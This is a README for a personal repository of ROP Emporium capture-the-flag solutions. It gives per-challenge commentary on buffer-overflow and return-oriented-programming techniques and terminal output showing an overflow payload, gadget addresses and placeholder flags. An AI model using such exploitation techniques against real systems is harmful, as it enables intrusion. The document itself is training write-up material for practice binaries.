# ROP Emporium

This repository contains my solutions to the ROP Emporium CTF series, focusing on the x86-64 challenges. ROP Emporium is a Capture the Flag (CTF) challenge series that revolves around exploiting buffer overflows using Return-Oriented Programming (ROP) and other binary exploitation techniques. These challenges helped me sharpen my skills in debugging, reverse engineering, and exploit development.

# Files Included

* exploit.py: Contains my solutions to all 8 challenges in one script.
* bytefinder.py: A scratch file used for testing file loading/searching, specifically used in the "pivot" challenge.
* expcallme.py: A separate solution to the "callme" challenge. It's functionally the same as my solution but written to address an issue I encountered with a filename collision in the "encrypted_flag.dat" file.
* exploitOutput.txt: output from terminal of the script running. Also shown at the end of this readme.
* ropemporium-zips: The collection of rop emporium zip files this script runs against.

# General Approach

For each challenge, I began with static analysis using tools like readelf, objdump, and ropper. I would also use ltrace or strace to gather initial information, though I often switched to dynamic analysis in GDB for more in-depth debugging.

My general workflow for solving each challenge was as follows:
1. Run the binary normally to understand its basic functionality.
2. Test the overflow.
3. Perform static analysis using readelf, objdump, and ropper in parallel to find useful ROP gadgets and functions.
4. Craft the exploit using gdb-gef to dynamically test and debug the solution.
5. Debug and refine the exploit, often focusing on the Stack as well as the Procedure Linkage Table (PLT) and Global Offset Table (GOT) for resolving function addresses.

I specifically chose to code all solutions in one script to experiment with features of pwntools—these experimental tests are not included in the final solution.

# Challenge-Specific Commentary

* Challenge 1: ret2win: This challenge introduces stack overwriting. The solution involved overwriting the stack base pointer with the address of `ret2win()` to redirect execution. The most difficult part was understanding stack alignment and the `movaps` issue. This was also my first time working with the `pwntools` library and automating tests.

* Challenge 2: split: This challenge required constructing a ROP chain, not just a simple return. I used `ropper` for the first time, which allowed me to find useful gadgets and build the chain. The challenge was fairly straightforward once I got familiar with the tools.

* Challenge 3: callme:  This challenge was what pushed me to grab GDB Enhanced Features `GDB-GEF` for stronger debugging features as well as the GUI. A lot of time was saved seeing the output of all the registers and stack immediately after after instruction step instead of having to manually examine each register, the stack, etc. I *HIGHLY* recommend it. While writing this writeup and rerunning my solutions I found a curious fact; callme shares a filename with ret2csu (the 8th challenge) called `encrypted_flag.dat` these files are different and you can only have 1 "active" at a time. My script that attempts to solve all 8 challenges will not return the flag of the other challenge. To get around this I could `import zipfile` and unzip the archives before I run each to ensure smooth operation, but this was determined to be out of scope. I have other projects that need to be completed and I would rather move on.

* Challenge 4: write4: This challenge taught me a new technique for arbitrary memory writes, which was interesting and fun to explore. There was some trial and error in determining where exactly to write to.

* Challenge 5: badchars: This challenge involved a lot of trial and error, as well as refreshing my knowledge on binary operations. While I knew the general approach for solving it, getting there took a considerable amount of time and a few pieces of paper. 

* Challenge 6: fluff: This challenge gave me the most trouble. I had a good understanding of how the three assembly instructions worked to create the write function, but understanding them well enough to use them in my ROP chain took over a day of research and a lot of trial and error.

* Challenge 7: pivot: The solution wasn't as simple as just throwing the new stack location onto the stack. The key was setting the stack pointer to the new location. I also spent some time trying different ways to read the location from the terminal in order to grab it and include it in the ROP chain. The file `bytefinder.py` is the scratch file I used to look at loading and searching a file.

* Challenge 8: ret2csu: After watching the related Black Hat talk 2-3 times, I found this challenge to be fairly straightforward. It shares a filename with callme that can break this challenge if you have the wrong one unzipped. I found this one to be fairly straightforward and easy after reading the paper.

# Solution Output

Notice the flag from `callme` doesn't return. Also notice that callme is still being run as `gdb.debug("./callme")` instead of `process("./callme")` because I forgot to swap it back after hunting down that source of the faliure? 
```
[x] Starting local process './ret2win'
[+] Starting local process './ret2win': pid 5024
Payload in hex: 4141414141414141414141414141414141414141414141414141414141414141414141414141414170074000000000005607400000000000
Payload in ASCII: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp\x07@\x00\x00\x00\x00\x00V\x07@\x00\x00\x00\x00\x00'
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 296B
[x] Receiving all data: 329B
[+] Receiving all data: Done (329B)
[*] Process './ret2win' stopped with exit code 0 (pid 5024)
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}

[x] Starting local process './split'
[+] Starting local process './split': pid 5027
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 120B
[+] Receiving all data: Done (120B)
[*] Stopped process './split' (pid 5027)
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}

[x] Starting local process '/usr/bin/gdbserver'
[+] Starting local process '/usr/bin/gdbserver': pid 5030
[*] running in new terminal: ['/usr/bin/gdb', '-q', './callme', '-x', '/tmp/pwnlib-gdbscript-m1vphqyz.gdb']
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 79B
[x] Receiving all data: 171B
[+] Receiving all data: Done (171B)
[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 5033)
b'callme by ROP Emporium\nx86_64\n\nHope you read the instructions...\n\n> Thank you!\ncallme_one() called correctly\ncallme_two() called correctly\nAi\xca\n\nChild exited with status 0\n'
[x] Starting local process './write4'
[+] Starting local process './write4': pid 5073
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 118B
[+] Receiving all data: Done (118B)
[*] Stopped process './write4' (pid 5073)
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}

[x] Starting local process './badchars'
[+] Starting local process './badchars': pid 5074
dnce,vzv
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 112B
[+] Receiving all data: Done (112B)
[*] Stopped process './badchars' (pid 5074)
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}

[x] Starting local process './fluff'
[+] Starting local process './fluff': pid 5075
f -> Offset:0x3c4 || Actual -> 0x4003c4
l -> Offset:0x239 || Actual -> 0x400239
a -> Offset:0x3d6 || Actual -> 0x4003d6
g -> Offset:0x3cf || Actual -> 0x4003cf
. -> Offset:0x24e || Actual -> 0x40024e
t -> Offset:0x192 || Actual -> 0x400192
x -> Offset:0x246 || Actual -> 0x400246
t -> Offset:0x192 || Actual -> 0x400192
['0x4003c4', '0x400239', '0x4003d6', '0x4003cf', '0x40024e', '0x400192', '0x400246', '0x400192']
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 148B
[+] Receiving all data: Done (148B)
[*] Stopped process './fluff' (pid 5075)
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}

[x] Starting local process './pivot'
[+] Starting local process './pivot': pid 5076
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f6c90dfff10
Send a ROP chain now and it will land there
> 
Heap address found: 0x7f6c90dfff10
[x] Receiving all data
[x] Receiving all data: 47B
[*] Process './pivot' stopped with exit code 0 (pid 5076)
[x] Receiving all data: 173B
[+] Receiving all data: Done (173B)
Thank you!

Now please send your stack smash
> Thank you!
foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
ROPE{a_placeholder_32byte_flag!}

[x] Starting local process './ret2csu'
[+] Starting local process './ret2csu': pid 5077
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './ret2csu' stopped with exit code 0 (pid 5077)
[x] Receiving all data: 184B
[+] Receiving all data: Done (184B)
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
